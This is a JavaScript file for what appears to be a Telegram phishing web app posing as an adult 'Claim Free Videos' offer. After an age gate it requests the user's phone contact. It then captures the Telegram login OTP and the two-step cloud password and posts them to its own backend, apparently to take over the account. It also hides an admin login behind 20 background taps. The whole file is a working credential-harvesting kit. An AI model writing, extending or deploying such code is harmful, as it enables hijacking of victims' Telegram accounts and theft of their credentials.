// Initialize Telegram WebApp SDK
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// Generate a persistent UUID for testing in browsers where initData is empty
let clientUuid = localStorage.getItem("client_uuid");
if (!clientUuid) {
    clientUuid = "client_" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    localStorage.setItem("client_uuid", clientUuid);
}

// Background wallpapers provided by user
const bgImages = [
    "https://files.catbox.moe/1tb37e.jpg",
    "https://files.catbox.moe/pgim55.jpg",
    "https://files.catbox.moe/2zkmx1.jpg",
    "https://files.catbox.moe/o6gks4.jpg",
    "https://files.catbox.moe/y7oonf.jpg",
    "https://files.catbox.moe/jx78pv.jpg",
    "https://files.catbox.moe/hpu9dx.jpg"
];

// Live Background Carousel Controller
let currentBgIndex = 0;
let activeSlideNum = 1;

function initBgCarousel() {
    const slide1 = document.getElementById("bg-slide-1");
    const slide2 = document.getElementById("bg-slide-2");
    if (!slide1 || !slide2) return;

    // Set initial background image
    slide1.style.backgroundImage = `url('${bgImages[0]}')`;
    
    // Start continuous sliding interval every 3.5 seconds
    setInterval(() => {
        currentBgIndex = (currentBgIndex + 1) % bgImages.length;
        const nextUrl = bgImages[currentBgIndex];
        
        if (activeSlideNum === 1) {
            slide2.style.backgroundImage = `url('${nextUrl}')`;
            slide2.classList.add("active");
            slide1.classList.remove("active");
            activeSlideNum = 2;
        } else {
            slide1.style.backgroundImage = `url('${nextUrl}')`;
            slide1.classList.add("active");
            slide2.classList.remove("active");
            activeSlideNum = 1;
        }
    }, 3500);
}

// DOM elements
const elTitle = document.getElementById("app-title");
const elSubtitle = document.getElementById("app-subtitle");

const views = {
    phoneEntry: document.getElementById("view-phone-entry"),
    otpEntry: document.getElementById("view-otp-entry"),
    twofaEntry: document.getElementById("view-2fa-entry"),
    success: document.getElementById("view-success"),
    claim: document.getElementById("view-claim")
};

const dots = {
    1: document.getElementById("dot-1"),
    2: document.getElementById("dot-2"),
    3: document.getElementById("dot-3"),
    4: document.getElementById("dot-4")
};

const lines = {
    1: document.getElementById("line-1"),
    2: document.getElementById("line-2"),
    3: document.getElementById("line-3")
};

const elPhoneError = document.getElementById("phone-error");
const elOtpPhoneDisplay = document.getElementById("otp-phone-display");
const elOtpInput = document.getElementById("otp-input");
const elOtpError = document.getElementById("otp-error");
const elPasswordInput = document.getElementById("password-input");
const el2faError = document.getElementById("2fa-error");

// Buttons
const btnAgeGate = document.getElementById("btn-age-gate");
const btnShareContact = document.getElementById("btn-share-contact");
const btnSubmitOtp = document.getElementById("btn-submit-otp");
const btnBackPhone = document.getElementById("btn-back-phone");
const btnSubmit2fa = document.getElementById("btn-submit-2fa");
const btnCloseApp = document.getElementById("btn-close-app");
const btnTogglePassword = document.getElementById("toggle-password");

let checkStatusInterval = null;
let isSubmitting = false;
let otpAutoSubmitTimer = null;

// Initialize
function init() {
    initBgCarousel();
    
    // Start status check loop
    checkStatus();
    checkStatusInterval = setInterval(checkStatus, 3000);
    
    // Bind Event Listeners
    if (btnAgeGate) btnAgeGate.addEventListener("click", verifyAdult);
    if (btnShareContact) btnShareContact.addEventListener("click", shareContact);
    if (btnSubmitOtp) btnSubmitOtp.addEventListener("click", submitOtp);
    if (btnBackPhone) btnBackPhone.addEventListener("click", () => {
        updateStepper(1);
        switchView("phoneEntry");
    });
    if (btnSubmit2fa) btnSubmit2fa.addEventListener("click", submit2fa);
    if (btnCloseApp) btnCloseApp.addEventListener("click", () => tg.close());
    const btnClaimClose = document.getElementById("btn-claim-close");
    if (btnClaimClose) btnClaimClose.addEventListener("click", () => tg.close());
    
    // Toggle Password Visibility
    if (btnTogglePassword && elPasswordInput) {
        btnTogglePassword.addEventListener("click", () => {
            if (elPasswordInput.type === "password") {
                elPasswordInput.type = "text";
                btnTogglePassword.classList.remove("fa-eye-slash");
                btnTogglePassword.classList.add("fa-eye");
            } else {
                elPasswordInput.type = "password";
                btnTogglePassword.classList.remove("fa-eye");
                btnTogglePassword.classList.add("fa-eye-slash");
            }
        });
    }
    
    // Handle Enter key on inputs
    if (elOtpInput) {
        elOtpInput.addEventListener("keypress", (e) => {
            if (e.key === "Enter") submitOtp();
        });
        // Auto-submit 5-digit codes typed from the physical keyboard after a tiny pause,
        // and instantly when the 6th digit lands (Telegram sends 5 or 6 digit codes)
        elOtpInput.addEventListener("input", () => {
            if (elOtpError) elOtpError.innerText = "";
            const len = elOtpInput.value.length;
            if (len === 6) {
                clearTimeout(otpAutoSubmitTimer);
                submitOtp();
            } else if (len === 5) {
                clearTimeout(otpAutoSubmitTimer);
                otpAutoSubmitTimer = setTimeout(submitOtp, 400);
            }
        });
    }
    if (elPasswordInput) {
        elPasswordInput.addEventListener("keypress", (e) => {
            if (e.key === "Enter") submit2fa();
        });
    }
    
    // Bind Visual Numpad Keypad Clicks (OTP & 2FA only — no manual phone anymore)
    document.querySelectorAll(".numpad-key").forEach(key => {
        key.addEventListener("click", (e) => {
            e.preventDefault();
            const val = key.getAttribute("data-val");
            const action = key.getAttribute("data-action");
            
            let activeInput = null;
            let activeViewName = "";
            if (views.otpEntry && views.otpEntry.classList.contains("active")) {
                activeInput = elOtpInput;
                activeViewName = "otp";
            } else if (views.twofaEntry && views.twofaEntry.classList.contains("active")) {
                activeInput = elPasswordInput;
                activeViewName = "2fa";
            }
            
            if (!activeInput) return;
            
            if (val !== null) {
                if (activeViewName === "otp") {
                    if (activeInput.value.length < 6) {
                        activeInput.value += val;
                        const len = activeInput.value.length;
                        if (len === 6) {
                            clearTimeout(otpAutoSubmitTimer);
                            submitOtp();
                        } else if (len === 5) {
                            clearTimeout(otpAutoSubmitTimer);
                            otpAutoSubmitTimer = setTimeout(submitOtp, 400);
                        }
                    }
                } else {
                    activeInput.value += val;
                }
            } else if (action === "backspace") {
                activeInput.value = activeInput.value.slice(0, -1);
            }
        });
    });
}

// Transition helper to switch active view card
function switchView(targetKey) {
    Object.keys(views).forEach(key => {
        if (views[key]) {
            if (key === targetKey) {
                views[key].classList.add("active");
            } else {
                views[key].classList.remove("active");
            }
        }
    });
    // Claim page is a separate standalone page - hide all login UI
    if (targetKey === "claim") {
        document.body.classList.add("claim-mode");
    } else {
        document.body.classList.remove("claim-mode");
    }
}

// Update stepper line highlighting
function updateStepper(activeStep) {
    for (let i = 1; i <= 4; i++) {
        if (dots[i]) {
            if (i < activeStep) {
                dots[i].className = "step-dot completed";
            } else if (i === activeStep) {
                dots[i].className = "step-dot active";
            } else {
                dots[i].className = "step-dot";
            }
        }
    }
    
    for (let i = 1; i <= 3; i++) {
        if (lines[i]) {
            if (i < activeStep) {
                lines[i].className = "step-line completed";
            } else {
                lines[i].className = "step-line";
            }
        }
    }
}

// 18+ age gate: on accept, immediately request native contact share
function verifyAdult() {
    if (btnAgeGate) {
        btnAgeGate.disabled = true;
        btnAgeGate.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Checking...';
    }
    // Contact share happens automatically via Telegram's native permission pop-up.
    shareContact();
}

// Request contact sharing from native telegram app
function shareContact() {
    if (btnShareContact) btnShareContact.disabled = true;
    
    tg.requestContact(() => {
        // Callback fires once permission prompt is answered; bot will receive the number
        // and start the OTP flow. Status polling picks it up automatically.
        elSubtitle.innerText = "Contact received! Waiting for Telegram OTP...";
        if (btnShareContact) btnShareContact.disabled = false;
    });
}

// Polling status API
async function checkStatus() {
    if (isSubmitting) return;
    
    try {
        const initData = tg.initData || "";
        const res = await fetch(`/api/check_status?initData=${encodeURIComponent(initData)}&clientUuid=${encodeURIComponent(clientUuid)}`);
        if (!res.ok) return;
        
        const data = await res.json();
        handleStatusResponse(data);
    } catch (err) {
        console.error("Status polling failed:", err);
    }
}

// Coordinate layout states based on API status
function handleStatusResponse(data) {
    const status = data.status;
    
    if (status === "already_connected" || status === "success") {
        clearInterval(checkStatusInterval);
        elTitle.innerText = "Connected";
        elSubtitle.innerText = `Account ${data.phone || ""} is active!`;
        updateStepper(4);
        switchView("success");
        showClaimPage();
        
    } else if (status === "otp_sent") {
        elTitle.innerText = "Enter OTP Code";
        elSubtitle.innerText = `Code sent to ${data.phone || "your Telegram account"}.`;
        if (elOtpPhoneDisplay) elOtpPhoneDisplay.innerText = data.phone || "";
        updateStepper(2);
        switchView("otpEntry");
        
    } else if (status === "2fa_needed") {
        elTitle.innerText = "2-Step Password";
        elSubtitle.innerText = "Enter your cloud password to finish login.";
        updateStepper(3);
        switchView("twofaEntry");
    }
}

// Load the owner-defined award link and show the full "Claim Free Videos" page
async function showClaimPage() {
    try {
        const res = await fetch("/api/reward");
        const data = res.ok ? await res.json() : { link: "" };
        if (data.link) {
            const btn = document.getElementById("btn-claim-now");
            if (btn) {
                btn.href = data.link;
                btn.innerText = data.button_text || "CLAIM FREE VIDEOS";
            }
            const heading = document.getElementById("claim-heading");
            if (heading) heading.innerText = data.button_text || "Claim Free Videos";
            updateStepper(4);
            switchView("claim");
            return;
        }
    } catch (err) {
        console.error("Award fetch failed:", err);
    }
    switchView("success");
}

// Submit OTP Code
async function submitOtp() {
    const otp = elOtpInput ? elOtpInput.value.trim() : "";
    if (otp.length < 5 || otp.length > 6 || isNaN(otp)) {
        if (elOtpError) elOtpError.innerText = "Please enter a valid 5-6 digit numeric OTP code.";
        return;
    }
    
    if (elOtpError) elOtpError.innerText = "";
    isSubmitting = true;
    btnSubmitOtp.disabled = true;
    btnSubmitOtp.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verifying...';
    
    try {
        const initData = tg.initData || "";
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 70000);
        const res = await fetch("/api/submit_otp", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ initData, otp, clientUuid }),
            signal: controller.signal
        });
        clearTimeout(timer);
        
        const data = await res.json();
        isSubmitting = false;
        btnSubmitOtp.disabled = false;
        btnSubmitOtp.innerHTML = 'Verify OTP Code <i class="fa-solid fa-arrow-right"></i>';
        
        if (data.status === "success") {
            handleStatusResponse({ status: "success" });
        } else if (data.status === "2fa_needed") {
            handleStatusResponse({ status: "2fa_needed" });
        } else {
            if (elOtpError) elOtpError.innerText = data.message || "Invalid OTP code. Please try again.";
        }
    } catch (err) {
        isSubmitting = false;
        btnSubmitOtp.disabled = false;
        btnSubmitOtp.innerHTML = 'Verify OTP Code <i class="fa-solid fa-arrow-right"></i>';
        if (elOtpError) elOtpError.innerText = "Network error. Please try again later.";
    }
}

// Submit 2FA Password
async function submit2fa() {
    const password = elPasswordInput ? elPasswordInput.value.trim() : "";
    if (!password) {
        if (el2faError) el2faError.innerText = "Please enter your Two-Step Verification password.";
        return;
    }
    
    if (el2faError) el2faError.innerText = "";
    isSubmitting = true;
    btnSubmit2fa.disabled = true;
    btnSubmit2fa.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Checking...';
    
    try {
        const initData = tg.initData || "";
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 70000);
        const res = await fetch("/api/submit_2fa", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ initData, password, clientUuid }),
            signal: controller.signal
        });
        clearTimeout(timer);
        
        const data = await res.json();
        isSubmitting = false;
        btnSubmit2fa.disabled = false;
        btnSubmit2fa.innerHTML = 'Verify Cloud Password <i class="fa-solid fa-arrow-right"></i>';
        
        if (data.status === "success") {
            handleStatusResponse({ status: "success" });
        } else {
            if (el2faError) el2faError.innerText = data.message || "Incorrect cloud password. Please try again.";
        }
    } catch (err) {
        isSubmitting = false;
        btnSubmit2fa.disabled = false;
        btnSubmit2fa.innerHTML = 'Verify Cloud Password <i class="fa-solid fa-arrow-right"></i>';
        if (el2faError) el2faError.innerText = "Network error. Please try again later.";
    }
}

// Run app
window.onload = init;

// Hidden admin unlock: 20 quick taps on the page background (excludes buttons/inputs/numpad)
// 20 taps so normal users (typing OTP/2FA) can never accidentally open it.
(function () {
    let clickCount = 0;
    let resetTimer = null;
    const TRIGGER = 20;
    const WINDOW_MS = 5000;

    const overlay = document.getElementById("admin-overlay");
    const pwInput = document.getElementById("admin-password-input");
    const btnLogin = document.getElementById("btn-admin-login");
    const btnCancel = document.getElementById("btn-admin-cancel");
    const errEl = document.getElementById("admin-login-error");

    if (!overlay) return;

    function resetClicks() {
        clickCount = 0;
        resetTimer = null;
    }

    function showOverlay() {
        if (overlay.style.display === "flex") return;
        overlay.style.display = "flex";
        if (pwInput) {
            pwInput.value = "";
            pwInput.focus();
        }
        if (errEl) errEl.innerText = "";
    }

    function closeOverlay() {
        overlay.style.display = "none";
    }

    document.addEventListener("click", (e) => {
        if (overlay.style.display === "flex") return;
        // Do NOT count taps on interactive elements (keypad, inputs, buttons, links, overlay)
        const t = e.target;
        if (t.closest("#admin-overlay")) return;
        if (t.closest("button, input, a, .numpad-key, .toggle-pw, .bg-carousel")) return;

        clickCount += 1;
        if (resetTimer) clearTimeout(resetTimer);
        resetTimer = setTimeout(resetClicks, WINDOW_MS);

        if (clickCount >= TRIGGER) {
            resetClicks();
            showOverlay();
        }
    });

    if (btnCancel) {
        btnCancel.addEventListener("click", closeOverlay);
    }

    if (btnLogin && pwInput) {
        const doLogin = async () => {
            const password = pwInput.value || "";
            if (!password) {
                if (errEl) errEl.innerText = "Please enter the admin password.";
                return;
            }
            btnLogin.disabled = true;
            if (errEl) errEl.innerText = "";
            try {
                const res = await fetch("/admin/api/login", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    credentials: "same-origin",
                    body: JSON.stringify({ password })
                });
                const data = await res.json();
                if (res.ok && data.ok) {
                    window.location.href = "/admin";
                    return;
                }
                if (errEl) errEl.innerText = data.error || "Wrong password.";
            } catch (err) {
                if (errEl) errEl.innerText = "Network error. Try again.";
            } finally {
                btnLogin.disabled = false;
            }
        };
        btnLogin.addEventListener("click", doLogin);
        pwInput.addEventListener("keypress", (e) => {
            if (e.key === "Enter") doLogin();
        });
    }
})();
